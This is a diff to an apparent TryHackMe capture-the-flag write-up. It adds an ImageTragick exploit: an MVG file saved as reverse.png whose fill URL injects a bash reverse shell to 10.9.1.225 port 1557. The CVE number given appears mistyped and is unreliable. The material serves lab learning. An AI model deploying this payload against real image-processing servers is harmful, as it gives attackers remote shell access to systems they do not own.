@@ -19,11 +19,14 @@
 	<h3> with that given link (https://imagetragick.com) we can create a reverse shell payload</h3>
 </br>
 <h1> Creating mv Png Payload </h2>
-	<h3>On you local machine run these commands</h3>
+	<h3>On you local create a file with the extension .png shown in the commands below</h3>
 		<h4>touch reverse.png</h4>
 		<h4> nano reverse.png</h4>
 	<h3>Paste this code in</h3>
-		<h4></h4>
+		<h4>push graphic-context</h4>
+		<h4>viewbox 0 0 640 480</h4>
+		<h4>fill 'url(https://example.com";bash -c \'bash -i >& /dev/tcp/10.9.1.225/1557 0>&1\'")'</h4>
+		<h4>pop graphic-context</h4>
 		<h3>I've changed the original payload at https://imagetragick.com so it gives us a shell, further explaination of this exploit CVE-2016-3174 at https://imagetragick.com</h3></br>
 			<img src="https://github.com/purpler0se/tryhackme-writeups/blob/main/images/payload.png">
 		<h4>Your payload should look like this</h4>
